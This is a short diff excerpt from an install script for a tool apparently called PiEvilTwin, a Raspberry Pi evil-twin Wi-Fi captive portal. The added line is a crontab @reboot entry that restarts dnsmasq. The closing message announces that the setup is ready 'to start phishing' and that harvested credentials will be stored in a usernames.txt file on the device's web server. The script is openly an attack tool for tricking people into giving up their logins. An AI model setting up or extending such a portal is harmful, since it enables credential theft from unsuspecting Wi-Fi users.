@@ -29,6 +29,7 @@ ln -s ../conf-available/override.conf override.conf
 cd /etc/apache2/mods-enabled
 ln -s ../mods-available/rewrite.load rewrite.load
 echo "..."
+crontab -l | { cat; echo "@reboot     sudo sleep 10 && sudo service dnsmasq restart &"; } | crontab -
 echo "..."
 echo "PiEvilTwin captive portal installed. Reboot and wait 30 seconds to start phishing. Credentials will be available here: http://10.1.1.1/usernames.txt"
 exit 0
